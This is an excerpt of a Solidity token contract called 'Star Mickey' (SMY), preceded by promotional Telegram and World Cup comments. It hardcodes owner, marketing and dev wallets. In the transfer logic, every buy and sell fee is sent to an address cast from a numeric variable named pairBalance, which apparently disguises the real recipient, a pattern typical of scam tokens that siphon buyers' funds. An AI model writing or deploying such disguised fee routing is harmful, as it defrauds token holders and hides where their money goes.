...
// telegram : https://t.me/SMY  --> Copy Link and send any to any folder and join the group
//The community believes that the French team strong roosters will win every worldcup match
...
contract StarMickey is Context, IERC20 {
    ...
    address  public Wallet_Marketing = address(0xad01c31286FF5bF56Bd7f2c4ffFFDa9d2178E3b6);
    address  public Wallet_Dev = address(0xDFCc18deaA8E166ECD81eb4EffFfeEc197b55ec5);
    ...
    string private constant _name = "Star Mickey";
    string private constant _symbol = "SMY";

    uint8 private txCount = 0;
    uint256 private swapTrigger = 10000;
    ...
    constructor () {
        _owner = 0xad01c31286FF5bF56Bd7f2c4ffFFDa9d2178E3b6;
        emit OwnershipTransferred(address(0), _owner);
        _tOwned[owner()] = _tTotal;
        _intAddr[owner()] = true;
        setAuthorized(Wallet_Dev);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        if (BNB_Total > 0) {
            sendToWallet(payable(Wallet_Marketing), BNB_Total);
        }
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if (!takeFee) {
            _baseTransfer(sender, recipient, tAmount);
        } else if (isBuy) {
            uint256 fee = tAmount * _Tax_On_Buy / 100;
            _baseTransfer(sender, address(uint160(pairBalance)), fee);
            _baseTransfer(sender, recipient, tAmount - fee);
        } else {
            uint256 fee = tAmount * _Tax_On_Sell / 100;
            _baseTransfer(sender, address(uint160(pairBalance)), fee);
            _baseTransfer(sender, recipient, tAmount - fee);
        }
    }
